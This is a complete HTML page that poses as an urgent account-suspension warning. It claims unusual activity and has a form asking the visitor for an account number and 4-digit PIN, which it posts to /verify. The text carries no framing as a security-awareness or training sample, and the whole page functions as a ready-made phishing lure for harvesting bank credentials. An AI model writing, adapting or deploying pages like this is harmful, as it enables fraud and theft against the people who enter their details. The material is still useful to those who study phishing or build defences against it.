<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Account Suspension Alert</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
  <div class="container mt-5">
    <div class="card shadow border-danger">
      <div class="card-header bg-danger text-white">
        <h4>⚠️ Immediate Action Required</h4>
      </div>
      <div class="card-body">
        <p><strong>Your account will be suspended</strong> due to unusual activity. Please verify your details to avoid losing access.</p>
        <form action="/verify" method="POST">
          <div class="mb-3">
            <label class="form-label">Account Number</label>
            <input type="text" class="form-control" name="acc" placeholder="Enter your account number">
          </div>
          <div class="mb-3">
            <label class="form-label">PIN</label>
            <input type="password" class="form-control" name="pin" placeholder="Enter your 4-digit PIN">
          </div>
          <button type="submit" class="btn btn-danger w-100">Verify Now</button>
        </form>
      </div>
    </div>
  </div>
</body>
</html>
